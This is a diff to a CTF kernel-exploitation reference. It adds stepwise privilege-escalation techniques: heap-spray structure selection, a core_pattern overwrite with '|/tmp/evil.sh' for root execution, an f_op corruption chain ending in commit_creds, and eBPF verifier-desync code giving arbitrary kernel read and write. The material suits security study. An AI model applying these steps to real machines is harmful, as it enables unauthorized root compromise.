@@ -24,13 +24,17 @@
   - [Bruteforce Without Leak](#bruteforce-without-leak)
   - [Checking CONFIG_STATIC_USERMODEHELPER](#checking-config_static_usermodehelper)
 - [core_pattern Overwrite](#core_pattern-overwrite)
-For tty_struct kROP, userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).
+- [Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)](#kernel-heap-overflow-via-kmalloc-size-mismatch-plaidctf-2013)
+- [eBPF Verifier Bypass Exploitation (UIUCTF 2021, D^3CTF 2022)](#ebpf-verifier-bypass-exploitation-uiuctf-2021-d3ctf-2022)
+For tty_struct kROP (kernel Return-Oriented Programming), userfaultfd race stabilization, SLUB internals, cross-cache attacks, and DiceCTF 2026 kernel patterns, see [kernel-techniques.md](kernel-techniques.md).
 
 For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).
 
 ---
 
 ## Environment Setup and Recon
+
+**Key insight:** Before writing any exploit, check the QEMU launch script for enabled mitigations (`smep`, `smap`, `kpti`, `kaslr`) and the `oops=panic` flag. These determine which exploitation techniques are viable. Disable all mitigations for initial debugging, then re-enable them one by one.
 
 ### QEMU Debug Environment
 
@@ -82,7 +86,7 @@ ROPgadget --binary ./vmlinux > gadgets.txt
 | `STATIC_USERMODEHELPER` | Blocks `modprobe_path` overwrite | Disassemble `call_usermodehelper_setup` |
 | `KALLSYMS_ALL` | `.data` symbols in `/proc/kallsyms` | `grep modprobe_path /proc/kallsyms` |
 | `CONFIG_USERFAULTFD` | Enables userfaultfd syscall | Try calling it; disabled = -ENOSYS |
-| eBPF JIT | JIT-compiled BPF filters | `cat /proc/sys/net/core/bpf_jit_enable` (0=off, 1=on, 2=debug) |
+| eBPF (extended Berkeley Packet Filter) JIT | JIT-compiled BPF filters | `cat /proc/sys/net/core/bpf_jit_enable` (0=off, 1=on, 2=debug) |
 
 Check oops behavior:
 - `oops=panic` in QEMU `-append` -> oops causes full kernel panic
@@ -106,6 +110,8 @@ file vmlinux
 ## Useful Kernel Structures for Heap Spray
 
 These structures are allocated from standard `kmalloc` caches and controlled from userspace. Use them to fill freed slots for UAF exploitation or to leak kernel pointers.
+
+**Key insight:** Match the vulnerable object's `kmalloc` cache size to choose the right spray structure. For kmalloc-32, use `seq_operations` or `tty_file_private`; for kmalloc-1024, use `tty_struct`; for variable sizes (32-1024), use `poll_list`, `user_key_payload`, or `setxattr`.
 
 | Structure | Cache | Alloc Trigger | Free Trigger | Use |
 |-----------|-------|---------------|--------------|-----|
@@ -468,6 +474,8 @@ Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or th
 3. After `override_creds` returns, disassemble -- look for `movzx` loading from a data address
 4. That address is `core_pattern`
 
+**Key insight:** `core_pattern` is an alternative to `modprobe_path` when `CONFIG_STATIC_USERMODEHELPER` blocks modprobe. Overwrite it with `|/tmp/evil.sh` and crash any process to trigger root command execution. Finding the address requires a GDB breakpoint on `override_creds` during a deliberate crash since `core_pattern` is not always exported in `/proc/kallsyms`.
+
 ```text
 (gdb) finish
 (gdb) x/5i $rip
@@ -476,3 +484,72 @@ Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or th
 0xffffffff81eb0b20: "core"
 ```
 
+---
+
+## Kernel Heap Overflow via kmalloc Size Mismatch (PlaidCTF 2013)
+
+**Pattern:** Kernel module allocates `kmalloc(content_length)` but copies `0x40 + content_length` bytes (header + body), causing a 0x40-byte heap overflow into adjacent slab objects.
+
+```c
+// Vulnerable pattern in kernel HTTP handler:
+buf = kmalloc(content_length, GFP_KERNEL);
+memcpy(buf, http_header, 0x40);           // 0x40 bytes of header
+memcpy(buf + 0x40, body, content_length); // Overflow!
+```
+
+**Exploitation:**
+1. **Slab spray:** Open 1021 file descriptors (`open("/dev/kmalloc_target")`) to fill the kmalloc-256 slab cache
+2. **Create holes:** Close 3 files to create gaps in the slab for the overflowing allocation
+3. **Trigger overflow:** Send HTTP request with body that overflows into adjacent `struct file`
+4. **Corrupt `f_op`:** Overwrite the `f_op` (file operations) pointer in the adjacent `struct file` to redirect function pointers
+5. **Hijack write handler:** `f_op->write` now points to attacker-controlled address → `commit_creds(prepare_kernel_cred(0))`
+
+**Key insight:** `struct file` is in kmalloc-256 and contains `f_op` (function pointer table). Corrupting `f_op` to a fake vtable gives control over any file operation (`read`, `write`, `ioctl`). The attacker triggers the hijacked operation via the corrupted file descriptor.
+
+---
+
+## eBPF Verifier Bypass Exploitation (UIUCTF 2021, D^3CTF 2022)
+
+Exploit mismatches between the eBPF verifier's static analysis and runtime behavior to achieve arbitrary kernel read/write.
+
+```c
+// Pattern: Verifier tracks register states differently from hardware
+// Example: Right-shift desynchronization (D^3CTF 2022)
+// Verifier thinks: shr reg, 64 -> reg = 0
+// Hardware does:   shr reg, 64 -> reg = original_value (shift >= width = undefined)
+
+// Step 1: Create desynchronized register
+BPF_ALU64_IMM(BPF_RSH, BPF_REG_7, 64),  // verifier: R7=0, runtime: R7=1
+
+// Step 2: Use desync to bypass ALU sanitizer
+BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, offset),  // verifier: 0*offset=0, runtime: 1*offset=offset
+
+// Step 3: Add to map pointer for OOB access
+BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  // verifier allows (adding 0)
+// Runtime: map_ptr + offset -> arbitrary kernel memory access
+
+// Step 4: Read/write kernel memory, overwrite modprobe_path or cred struct
+```
+
+```bash
+# eBPF exploitation workflow:
+# 1. Find verifier vs runtime mismatch (RSH, bounds tracking, helper params)
+# 2. Create register with verifier_value != runtime_value
+# 3. Use desync register to bypass pointer arithmetic checks
+# 4. Achieve arbitrary read via map value OOB
+# 5. Leak kernel base from adjacent slab objects
+# 6. Arbitrary write to modprobe_path or current->cred
+
+# Helper function overflow variant (d3bpf-v2):
+# bpf_skb_load_bytes(skb, offset, stack_buf, len)
+# Verifier checks len <= 512, but desync makes runtime len huge
+# Stack buffer overflow -> ROP to commit_creds(init_cred)
+
+# KASLR bypass via eBPF:
+# Trigger controlled oops -> dmesg leaks kernel addresses
+# Or: read adjacent slab objects containing kernel pointers
+```
+
+**Key insight:** eBPF verifier bugs create a "type confusion" between static analysis and runtime. The pattern is always: (1) find operation where verifier prediction differs from hardware, (2) multiply the difference to create useful offsets, (3) add to map pointer for kernel memory access. Check kernel changelogs for eBPF verifier patches -- each patch implies a prior exploitable bug.
+
+See also: [kernel-techniques.md](kernel-techniques.md) for additional kernel exploitation techniques.
